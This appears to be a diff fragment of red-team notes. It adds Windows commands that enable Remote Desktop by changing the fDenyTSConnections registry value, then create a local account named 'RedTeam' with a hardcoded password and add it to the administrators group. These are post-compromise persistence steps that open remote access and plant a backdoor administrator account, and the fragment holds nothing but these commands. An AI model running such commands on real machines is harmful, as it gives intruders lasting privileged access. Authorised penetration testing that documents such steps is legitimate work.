@@ -1,0 +1,7 @@
+cmd
+   reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+### admin creation
+cmd
+net user RedTeam P@ssw0rd123 /add
+net localgroup administrators RedTeam /add
